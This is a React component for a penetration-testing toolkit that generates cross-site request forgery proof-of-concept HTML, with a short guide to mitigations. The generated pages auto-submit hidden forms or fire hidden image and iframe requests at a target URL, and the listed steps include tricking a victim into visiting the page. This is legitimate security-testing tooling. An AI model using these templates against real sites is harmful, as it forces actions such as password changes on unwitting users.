import { useState } from 'react';
import styles from './Tool.module.css';

export default function CSRFTester() {
  const [targetUrl, setTargetUrl] = useState('');
  const [method, setMethod] = useState<'GET' | 'POST'>('POST');
  const [parameters, setParameters] = useState('');
  const [pocHtml, setPocHtml] = useState('');

  const generatePOC = () => {
    if (!targetUrl.trim()) {
      alert('Please enter target URL');
      return;
    }

    const params = parameters
      .split('\n')
      .filter(p => p.trim())
      .map(p => {
        const [key, value] = p.split('=').map(s => s.trim());
        return { key, value: value || '' };
      });

    let html = '';

    if (method === 'GET') {
      const queryString = params.map(p => `${encodeURIComponent(p.key)}=${encodeURIComponent(p.value)}`).join('&');
      const fullUrl = `${targetUrl}${queryString ? '?' + queryString : ''}`;

      html = `<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - GET Request</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This page will automatically trigger a CSRF attack when loaded.</p>
    
    <!-- Auto-submit using image tag -->
    <img src="${fullUrl}" style="display:none;">
    
    <!-- Alternative: iframe -->
    <iframe src="${fullUrl}" style="display:none;"></iframe>
    
    <!-- Manual trigger -->
    <p><a href="${fullUrl}" target="_blank">Click here to manually trigger</a></p>
    
    <script>
        // Auto-redirect (optional)
        // window.location = '${fullUrl}';
    </script>
</body>
</html>`;
    } else {
      // POST request
      html = `<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - POST Request</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This form will automatically submit when the page loads.</p>
    
    <form id="csrfForm" action="${targetUrl}" method="POST">
${params.map(p => `        <input type="hidden" name="${p.key}" value="${p.value}">`).join('\n')}
        <input type="submit" value="Click if auto-submit failed">
    </form>
    
    <script>
        // Auto-submit the form
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>`;
    }

    setPocHtml(html);
  };

  const downloadPOC = () => {
    const blob = new Blob([pocHtml], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'csrf-poc.html';
    a.click();
    URL.revokeObjectURL(url);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(pocHtml);
  };

  return (
    <div className={styles.tool}>
      <div className={styles.toolHeader}>
        <div className={styles.toolTitle}>
          <span className={styles.toolIcon}>🔄</span>
          CSRF Tester
        </div>
        <div className={styles.toolSubtitle}>
          Generate Cross-Site Request Forgery proof-of-concept exploits
        </div>
      </div>

      <div className={styles.toolContent}>
        <div className={styles.inputGroup}>
          <label>Target URL</label>
          <input
            type="text"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
            placeholder="https://example.com/api/change-password"
          />
        </div>

        <div className={styles.inputGroup}>
          <label>HTTP Method</label>
          <select value={method} onChange={(e) => setMethod(e.target.value as 'GET' | 'POST')}>
            <option value="GET">GET</option>
            <option value="POST">POST</option>
          </select>
        </div>

        <div className={styles.inputGroup}>
          <label>Parameters (one per line, format: key=value)</label>
          <textarea
            value={parameters}
            onChange={(e) => setParameters(e.target.value)}
            placeholder="password=newpass123&#10;confirm=newpass123&#10;user_id=42"
          />
        </div>

        <button className={styles.primaryBtn} onClick={generatePOC}>
          Generate PoC
        </button>

        {pocHtml && (
          <div className={styles.outputSection}>
            <div className={styles.outputHeader}>
              <label>Generated HTML PoC</label>
              <div style={{ display: 'flex', gap: '8px' }}>
                <button className={styles.copyBtn} onClick={copyToClipboard}>
                  Copy
                </button>
                <button className={styles.copyBtn} onClick={downloadPOC}>
                  Download
                </button>
              </div>
            </div>
            <div className={styles.output}>{pocHtml}</div>
          </div>
        )}

        <div className={styles.infoBox}>
          <h3>CSRF Attack Vectors</h3>
          <p>This tool generates HTML pages that exploit CSRF vulnerabilities:</p>
          <ul>
            <li><strong>GET Requests:</strong> Uses image tags, iframes, or redirects</li>
            <li><strong>POST Requests:</strong> Auto-submitting forms with hidden inputs</li>
          </ul>
          
          <h3>Testing Steps</h3>
          <ol>
            <li>Identify a state-changing action (change password, transfer funds, etc.)</li>
            <li>Check if it requires CSRF tokens or SameSite cookies</li>
            <li>Generate PoC HTML with this tool</li>
            <li>Host the HTML and trick victim into visiting</li>
            <li>Verify if action executes without user consent</li>
          </ol>

          <h3>Mitigation</h3>
          <ul>
            <li>Implement anti-CSRF tokens in all state-changing requests</li>
            <li>Use SameSite cookie attribute (Strict or Lax)</li>
            <li>Verify Origin/Referer headers</li>
            <li>Require re-authentication for sensitive actions</li>
          </ul>

          <p className={styles.warning}>
            ⚠️ Only test CSRF on applications you own or have permission to test. Unauthorized testing is illegal.
          </p>
        </div>
      </div>
    </div>
  );
}
